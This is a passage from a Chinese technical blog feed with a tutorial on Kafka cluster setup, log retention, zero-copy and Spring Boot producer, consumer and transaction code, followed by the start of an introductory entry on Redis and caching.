id="Kafka高可用集群搭建实战-SpringBoot项目测试"><a href="#Kafka高可用集群搭建实战-SpringBoot项目测试" class="headerlink" title="Kafka高可用集群搭建实战+SpringBoot项目测试"></a>Kafka高可用集群搭建实战+SpringBoot项目测试</h1><p>启动Kafka实战</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 守护进程</span></span><br><span class="line">./kafka-server-start.sh -daemon ../config/server.properties &amp;</span><br><span class="line"></span><br><span class="line">./kafka-server-start.sh ../config/server.properties &amp;</span><br></pre></td></tr></table></figure><p>创建topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --create --zookeeper 101.132.252.118:2181,101.132.252.118:2182,101.132.252.118:2183 --replication-factor 3 --partitions 6 --topic xdclass-cluster-topic</span><br></pre></td></tr></table></figure><p>SpringBoot项目测试</p><ul><li>连接zookeeper集群</li><li>创建topic</li><li>查看topic详情</li><li>发送消息</li></ul><h2 id="Kafka的中的日志数据清理"><a href="#Kafka的中的日志数据清理" class="headerlink" title="Kafka的中的日志数据清理"></a>Kafka的中的日志数据清理</h2><ul><li><p>Kafka将数据持久化到了硬盘上，为了控制磁盘容量，需要对过去的消息进行清理</p></li><li><p>问题：如果让你去设计这个日志删除策略，你会怎么设计？【原理思想】很重要的体现，下面是kafka答案</p><ul><li>内部有个定时任务检测删除日志，默认是5分钟 log.retention.check.interval.ms</li><li>支持配置策略对数据清理</li><li>根据segment单位进行定期清理</li></ul></li><li><p>启用cleaner</p><ul><li>log.cleaner.enable=true</li><li>log.cleaner.threads = 2 (清理线程数配置)</li></ul></li><li><p>日志删除</p><ul><li><p>log.cleanup.policy=delete</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#清理超过指定时间的消息,默认是168小时，7天</span></span><br><span class="line"><span class="comment">#还有log.retention.ms, log.retention.minutes, log.retention.hours，优先级高到低</span></span><br><span class="line"><span class="meta">log.retention.hours</span>=<span class="string">168</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#超过指定大小后，删除旧的消息，下面是1G的字节数，-1就是没限制</span></span><br><span class="line"><span class="meta">log.retention.bytes</span>=<span class="string">1073741824</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#还有基于日志起始位移（log start offset)，未来社区还有更多</span></span><br></pre></td></tr></table></figure></li><li><p>基于【时间删除】 日志说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置了7天后删除，那7天如何确定呢？</span><br><span class="line"></span><br><span class="line">每个日志段文件都维护一个最大时间戳字段，每次日志段写入新的消息时，都会更新该字段</span><br><span class="line"></span><br><span class="line">一个日志段segment写满了被切分之后，就不再接收任何新的消息，最大时间戳字段的值也将保持不变</span><br><span class="line"></span><br><span class="line">kafka通过将当前时间与该最大时间戳字段进行比较，从而来判定是否过期</span><br></pre></td></tr></table></figure></li><li><p>基于【大小超过阈值】 删除日志 说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">假设日志段大小是500MB，当前分区共有4个日志段文件，大小分别是500MB，500MB，500MB和10MB</span><br><span class="line"></span><br><span class="line">10MB那个文件就是active日志段。</span><br><span class="line"></span><br><span class="line">此时该分区总的日志大小是3*500MB+10MB&#x3D;1500MB+10MB</span><br><span class="line"></span><br><span class="line">如果阈值设置为1500MB，那么超出阈值的部分就是10MB，小于日志段大小500MB，故Kafka不会执行任何删除操作，即使总大小已经超过了阈值；</span><br><span class="line"></span><br><span class="line">如果阈值设置为1000MB，那么超过阈值的部分就是500MB+10MB &gt; 500MB，此时Kafka会删除最老的那个日志段文件</span><br><span class="line"></span><br><span class="line">注意：超过阈值的部分必须要大于一个日志段的大小</span><br></pre></td></tr></table></figure></li><li><p>log.retention.bytes和log.retention.minutes任意一个达到要求，都会执行删除</p></li><li><p>日志压缩</p><ul><li>log.cleanup.policy=compact 启用压缩策略</li><li>按照消息key进行整理，有相同key不同value值，只保留最后一个</li></ul></li></ul></li></ul><h2 id="Kafka的高性能原理分析-ZeroCopy"><a href="#Kafka的高性能原理分析-ZeroCopy" class="headerlink" title="Kafka的高性能原理分析-ZeroCopy"></a>Kafka的高性能原理分析-ZeroCopy</h2><p>零拷贝ZeroCopy（SendFile）</p><ul><li>例子：将一个File读取并发送出去（Linux有两个上下文，内核态，用户态）<ul><li>File文件的经历了4次copy<ul><li>调用read,将文件拷贝到了kernel内核态</li><li>CPU控制 kernel态的数据copy到用户态</li><li>调用write时，user态下的内容会copy到内核态的socket的buffer中</li><li>最后将内核态socket buffer的数据copy到网卡设备中传送</li></ul></li><li>缺点：增加了上下文切换、浪费了2次无效拷贝(即步骤2和3)</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613182530.png" alt="image-20210613182527789"></p><ul><li>ZeroCopy：<ul><li>请求kernel直接把disk的data传输给socket，而不是通过应用程序传输。Zero copy大大提高了应用程序的性能，减少不必要的内核缓冲区跟用户缓冲区间的拷贝，从而减少CPU的开销和减少了kernel和user模式的上下文切换，达到性能的提升</li><li>对应零拷贝技术有mmap及sendfile<ul><li>mmap:小文件传输快</li><li>sendfile:大文件传输比mmap快</li></ul></li><li>应用：Kafka、Netty、RocketMQ等都采用了零拷贝技术</li></ul></li></ul><h2 id="Kafka的高性能原理分析归纳总结"><a href="#Kafka的高性能原理分析归纳总结" class="headerlink" title="Kafka的高性能原理分析归纳总结"></a>Kafka的高性能原理分析归纳总结</h2><p>kafka高性能</p><ul><li>存储模型，topic多分区，每个分区多segment段</li><li>index索引文件查找，利用分段和稀疏索引</li><li>磁盘顺序写入</li><li>异步操作少阻塞sender和main线程，批量操作(batch)</li><li>页缓存Page cache，没利用JVM内存，因为容易GC影响性能</li><li>零拷贝ZeroCopy（SendFile）</li></ul><h1 id="SpringBoot项目整合Spring-kafka和事务消息实战"><a href="#SpringBoot项目整合Spring-kafka和事务消息实战" class="headerlink" title="SpringBoot项目整合Spring-kafka和事务消息实战"></a>SpringBoot项目整合Spring-kafka和事务消息实战</h1><h2 id="Springboot项目整合spring-kafka依赖包配置"><a href="#Springboot项目整合spring-kafka依赖包配置" class="headerlink" title="Springboot项目整合spring-kafka依赖包配置"></a>Springboot项目整合spring-kafka依赖包配置</h2><p>添加pom文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置文件修改增加生产者信息</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">bootstrap-servers:</span> <span class="number">101.132</span><span class="number">.252</span><span class="number">.118</span><span class="string">:9092,101.132.252.118:9093,101.132.252.118:9094</span></span><br><span class="line">    <span class="attr">producer:</span></span><br><span class="line">      <span class="comment"># 消息重发的次数</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">0</span></span><br><span class="line">      <span class="comment"># 一个批次可以使用的内存大小</span></span><br><span class="line">      <span class="attr">batch-size:</span> <span class="number">16384</span></span><br><span class="line">      <span class="comment"># 设置生产者内存缓冲区的大小</span></span><br><span class="line">      <span class="attr">buffer-memory:</span> <span class="number">33554432</span></span><br><span class="line">      <span class="comment"># 键的序列化方式</span></span><br><span class="line">      <span class="attr">key-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="comment"># 值的序列化方式</span></span><br><span class="line">      <span class="attr">value-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="attr">acks:</span> <span class="string">all</span></span><br></pre></td></tr></table></figure><p>发送消息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> String TOPIC_NAME = <span class="string">"user.register.topic"</span>;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String, Object&gt; kafkaTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/api/v1/&#123;num&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendMessage</span><span class="params">(@PathVariable(<span class="string">"num"</span>)</span> String num)</span>&#123;</span><br><span class="line"></span><br><span class="line">        kafkaTemplate.send(TOPIC_NAME,<span class="string">"这是一个消息，num="</span>+num).addCallback(success-&gt;&#123;</span><br><span class="line">            String topic = success.getRecordMetadata().topic();</span><br><span class="line">            <span class="keyword">int</span> partition = success.getRecordMetadata().partition();</span><br><span class="line">            <span class="keyword">long</span> offset = success.getRecordMetadata().offset();</span><br><span class="line">            System.out.println(<span class="string">"发送成功：topic="</span>+topic+<span class="string">", partition="</span>+partition+<span class="string">", offset="</span>+offset);</span><br><span class="line">        &#125;,failure-&gt;&#123;</span><br><span class="line">            System.out.println(<span class="string">"发送失败："</span>+failure.getMessage());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Springboot项目整合spring-kafka监听消费消息"><a href="#Springboot项目整合spring-kafka监听消费消息" class="headerlink" title="Springboot项目整合spring-kafka监听消费消息"></a>Springboot项目整合spring-kafka监听消费消息</h2><p>配置文件修改增加消费者信息</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">kafka:</span></span><br><span class="line">    <span class="attr">bootstrap-servers:</span> <span class="number">101.132</span><span class="number">.252</span><span class="number">.118</span><span class="string">:9092,101.132.252.118:9093,101.132.252.118:9094</span></span><br><span class="line">    <span class="attr">producer:</span></span><br><span class="line">      <span class="comment"># 消息重发的次数。</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">1</span></span><br><span class="line">      <span class="comment">#一个批次可以使用的内存大小</span></span><br><span class="line">      <span class="attr">batch-size:</span> <span class="number">16384</span></span><br><span class="line">      <span class="comment"># 设置生产者内存缓冲区的大小。</span></span><br><span class="line">      <span class="attr">buffer-memory:</span> <span class="number">33554432</span></span><br><span class="line">      <span class="comment"># 键的序列化方式</span></span><br><span class="line">      <span class="attr">key-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="comment"># 值的序列化方式</span></span><br><span class="line">      <span class="attr">value-serializer:</span> <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line">      <span class="attr">acks:</span> <span class="string">all</span></span><br><span class="line">      <span class="comment">#事务id</span></span><br><span class="line">      <span class="attr">transaction-id-prefix:</span> <span class="string">xdclass-tran-</span></span><br><span class="line">    <span class="attr">consumer:</span></span><br><span class="line">      <span class="comment"># 自动提交的时间间隔 在spring boot 2.X 版本是值的类型为Duration 需要符合特定的格式，如1S,1M,2H,5D</span></span><br><span class="line">      <span class="attr">auto-commit-interval:</span> <span class="string">1S</span></span><br><span class="line">      <span class="comment"># 该属性指定了消费者在读取一个没有偏移量的分区或者偏移量无效的情况下该作何处理：</span></span><br><span class="line">      <span class="attr">auto-offset-reset:</span> <span class="string">earliest</span></span><br><span class="line">      <span class="comment"># 是否自动提交偏移量，默认值是true,为了避免出现重复数据和数据丢失，可以把它设置为false,然后手动提交偏移量</span></span><br><span class="line">      <span class="attr">enable-auto-commit:</span> <span class="literal">false</span></span><br><span class="line">      <span class="comment"># 键的反序列化方式</span></span><br><span class="line">      <span class="attr">key-deserializer:</span> <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line">      <span class="comment"># 值的反序列化方式</span></span><br><span class="line">      <span class="attr">value-deserializer:</span> <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="comment">#手工ack，调用ack后立刻提交offset</span></span><br><span class="line">      <span class="attr">ack-mode:</span> <span class="string">manual_immediate</span></span><br><span class="line">      <span class="comment">#容器运行的线程数</span></span><br><span class="line">      <span class="attr">concurrency:</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>代码编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MQListener</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  消费监听</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> record</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@KafkaListener</span>(topics = &#123;<span class="string">"user.register.topic"</span>&#125;,groupId = <span class="string">"xdlcass-test-gp"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMessage1</span><span class="params">(ConsumerRecord&lt;?, ?&gt; record, Acknowledgment ack, @Header(KafkaHeaders.RECEIVED_TOPIC)</span> String topic)</span>&#123;</span><br><span class="line">        <span class="comment">// 打印出消息内容</span></span><br><span class="line">        System.out.println(<span class="string">"消费："</span>+record.topic()+<span class="string">"-"</span>+record.partition()+<span class="string">"-"</span>+record.value());</span><br><span class="line">        ack.acknowledge();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kafka事务消息-整合SpringBoot实战"><a href="#Kafka事务消息-整合SpringBoot实战" class="headerlink" title="Kafka事务消息-整合SpringBoot实战"></a>Kafka事务消息-整合SpringBoot实战</h2><ul><li><p>Kafka 从 0.11 版本开始引入了事务支持</p><ul><li>事务可以保证对多个分区写入操作的原子性</li><li>操作的原子性是指多个操作要么全部成功，要么全部失败，不存在部分成功、部分失败的可能</li></ul></li><li><p>配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">kafka</span>:<span class="string"></span></span><br><span class="line">    <span class="meta">bootstrap-servers</span>: <span class="string">112.74.55.160:9092,112.74.55.160:9093,112.74.55.160:9094</span></span><br><span class="line">    <span class="attr">producer</span>:<span class="string"></span></span><br><span class="line"><span class="comment">      # 消息重发的次数。 配置事务的话：如果用户显式地指定了 retries 参数，那么这个参数的值必须大于0</span></span><br><span class="line"><span class="comment">      #retries: 1</span></span><br><span class="line"><span class="comment">      #一个批次可以使用的内存大小</span></span><br><span class="line">      <span class="meta">batch-size</span>: <span class="string">16384</span></span><br><span class="line"><span class="comment">      # 设置生产者内存缓冲区的大小。</span></span><br><span class="line">      <span class="meta">buffer-memory</span>: <span class="string">33554432</span></span><br><span class="line"><span class="comment">      # 键的序列化方式</span></span><br><span class="line">      <span class="meta">key-serializer</span>: <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line"><span class="comment">      # 值的序列化方式</span></span><br><span class="line">      <span class="meta">value-serializer</span>: <span class="string">org.apache.kafka.common.serialization.StringSerializer</span></span><br><span class="line"><span class="comment">      #配置事务的话：如果用户显式地指定了 acks 参数，那么这个参数的值必须-1 all</span></span><br><span class="line"><span class="comment">      #acks: all</span></span><br><span class="line"></span><br><span class="line"><span class="comment">      #事务id</span></span><br><span class="line">      <span class="meta">transaction-id-prefix</span>: <span class="string">xdclass-tran</span></span><br><span class="line">    <span class="attr">consumer</span>:<span class="string"></span></span><br><span class="line"><span class="comment">      # 自动提交的时间间隔 在spring boot 2.X 版本是值的类型为Duration 需要符合特定的格式，如1S,1M,2H,5D</span></span><br><span class="line">      <span class="meta">auto-commit-interval</span>: <span class="string">1S</span></span><br><span class="line"></span><br><span class="line"><span class="comment">      # 该属性指定了消费者在读取一个没有偏移量的分区或者偏移量无效的情况下该作何处理：</span></span><br><span class="line">      <span class="meta">auto-offset-reset</span>: <span class="string">earliest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">      # 是否自动提交偏移量，默认值是true,为了避免出现重复数据和数据丢失，可以把它设置为false,然后手动提交偏移量</span></span><br><span class="line">      <span class="meta">enable-auto-commit</span>: <span class="string">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">      # 键的反序列化方式</span></span><br><span class="line">      <span class="meta">key-deserializer</span>: <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line"><span class="comment">      # 值的反序列化方式</span></span><br><span class="line">      <span class="meta">value-deserializer</span>: <span class="string">org.apache.kafka.common.serialization.StringDeserializer</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">listener</span>:<span class="string"></span></span><br><span class="line"><span class="comment">      # 在侦听器容器中运行的线程数。</span></span><br><span class="line">      <span class="attr">concurrency</span>: <span class="string">4</span></span><br><span class="line"><span class="comment">      #listner负责ack，手动调用Acknowledgment.acknowledge()后立即提交</span></span><br><span class="line">      <span class="meta">ack-mode</span>: <span class="string">manual_immediate</span></span><br><span class="line"><span class="comment">      #避免出现主题未创建报错</span></span><br><span class="line">      <span class="meta">missing-topics-fatal</span>: <span class="string">false</span></span><br></pre></td></tr></table></figure></li><li><p>SpringBoot代码编写</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 注解方式的事务</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> i</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/kafka/transaction1"</span>)</span><br><span class="line">    <span class="meta">@Transactional</span>(rollbackFor = RuntimeException<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">sendMessage1</span>(<span class="title">int</span> <span class="title">i</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        kafkaTemplate.send(TOPIC_NAME, <span class="string">"这个是事务里面的消息：1  i="</span>+i);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"fail"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        kafkaTemplate.send(TOPIC_NAME, <span class="string">"这个是事务里面的消息：2  i="</span>+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明式事务支持</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> i</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/kafka/transaction2"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendMessage2</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        kafkaTemplate.executeInTransaction(<span class="keyword">new</span> KafkaOperations.OperationsCallback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">doInOperations</span><span class="params">(KafkaOperations kafkaOperations)</span> </span>&#123;</span><br><span class="line">                kafkaOperations.send(TOPIC_NAME,<span class="string">"这个是事务里面的消息：1  i="</span>+i);</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"input is error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                kafkaOperations.send(TOPIC_NAME,<span class="string">"这个是事务里面的消息：2  i="</span>+i);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="关于-Kafka的其他特性和技术选型建议"><a href="#关于-Kafka的其他特性和技术选型建议" class="headerlink" title="关于 Kafka的其他特性和技术选型建议"></a>关于 Kafka的其他特性和技术选型建议</h2><p>Kafka很多内容，但是不一定都要学，看自己的需求，有些功能是比较鸡肋的</p><ul><li>比如kafka streams 虽然轻量级<ul><li>但是与Kafka 紧密联系，无法在没有Kafka 的场景下使用</li><li>相较于实时计算工具Spark Streaming、Flink等，kafka streams不适用于大型业务场景</li><li>有些功能的话虽然kafka有，但还是用更好的工具比较好，且技术更新换代快，掌握设计思想才主要</li><li>更主要的是没有万能的框架，技术选型多数都是基于【 业务需求】出发，选出最合适的技术</li><li>kafka/rabbitmq/rocketmq</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;分布式流处理平台Kafka大纲速览&quot;&gt;&lt;a href=&quot;#分布式流处理平台Kafka大纲速览&quot; class=&quot;headerlink&quot; title=&quot;分布式流处理平台Kafka大纲速览&quot;&gt;&lt;/a&gt;分布式流处理平台Kafka大纲速览&lt;/h1&gt;&lt;h2 id=&quot;技术技术栈
      
    
    </summary>
    
    
      <category term="kafka" scheme="https://blog.kaluna.top/categories/kafka/"/>
    
    
      <category term="kafka" scheme="https://blog.kaluna.top/tags/kafka/"/>
    
  </entry>
  
  <entry>
    <title>分布式缓存Redis6.X+高可用集群</title>
    <link href="https://blog.kaluna.top/2021/06/01/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98Redis6.X+%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4/"/>
    <id>https://blog.kaluna.top/2021/06/01/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98Redis6.X+%E9%AB%98%E5%8F%AF%E7%94%A8%E9%9B%86%E7%BE%A4/</id>
    <published>2021-06-01T07:56:47.217Z</published>
    <updated>2021-10-25T02:10:15.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis6安装"><a href="#Redis6安装" class="headerlink" title="Redis6安装"></a>Redis6安装</h1><h2 id="队列和缓存"><a href="#队列和缓存" class="headerlink" title="队列和缓存"></a>队列和缓存</h2><p>什么是队列（MQ消息中间件）</p><ul><li>全称MessageQueue，主要是用于程序和程序直接通信，异步+解耦</li><li>使用场景：<ul><li>核心应用<ul><li>解耦：订单系统-》物流系统</li><li>异步：用户注册-》发送邮件，初始化信息</li><li>削峰：秒杀、日志处理</li></ul></li></ul></li></ul><p>什么是缓存</p><ul><li>程序经常要调用的对象存在内存中,方便其使用时可以快速调用,不必去数据库或者其他持久化设备中查询</li><li>主要 就是提高性能 DNS缓存、前端缓存、代理服务器缓存Nginx、应用程序缓存、数据库缓存</li></ul><h2 id="本地缓存和分布式缓存"><a href="#本地缓存和分布式缓存" class="headerlink" title="本地缓存和分布式缓存"></a>本地缓存和分布式缓存</h2><ul><li><p>分布式缓存</p><ul><li>与应用分离的缓存组件或服务，与本地应用隔离的一个独立的应用，多个应用可直接的共享缓存</li><li>常⻅的分布式缓存 Redis、Memcached等</li></ul></li><li><p>本地缓存</p><ul><li>和业务程序一起的缓存，例如myabtis的一级或者二级缓存，本地缓存自然是最快的，但是不能在多个节点共 享</li><li>常⻅的本地缓存<ul><li>myabtis 一级缓存、 mybatis二级缓存</li><li>框架本身的缓存</li><li>redis本地单机服 务</li><li>ehchche</li><li>guava cache</li><li>Caffeine</li></ul></li></ul></li><li><p>选择本地缓存和分布式缓存</p><p>避免带宽或者传输影响，本地缓存热点key数据，对于每次读请求，将首先检查key是否存在于本地缓存中，如果存在则直接返回，如果不存在再去访问分布式缓存的机器，缓存中的某些Key对应的value存储在集群中一台机器，使得所有流量涌向同一机器，成为系统的瓶颈，无法通过增加机器容量来解决。</p></li></ul><h2 id="什么是NosQL和Redis"><a href="#什么是NosQL和Redis" class="headerlink" title="什么是NosQL和Redis"></a>什么是NosQL和Redis</h2><p>什么是Redis</p><ul><li>属于NoSQL的一种 ( Not Only SQL )<ul><li>是不同于传统的关系数据库的数据库管理系统的统称</li><li>其两者最重要的区别是NoSQL不使用SQL作为查询语言。</li><li>NoSQL数据存储可以不需要固定的表格模式</li><li>键 - 值对存储，列存储，文档存储，图形数据库</li><li>NoSql：redis、memcached、mongodb、Hbase</li></ul></li><li>官网地址：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a><ul><li>中文：<a href="http://www.redis.cn/" target="_blank" rel="noopener">http://www.redis.cn/</a></li></ul></li><li>一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API</li><li>高性能：Redis能读的速度是110000次/s,写的速度是81000次/s</li><li>内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多 种类型的数据结构，如 字符串（strings）、散列（hashes）、 列表（lists）、 集合（sets）、 有序集合（sorted sets）等</li></ul><p>谁在使用Redis</p><ul><li>国外： 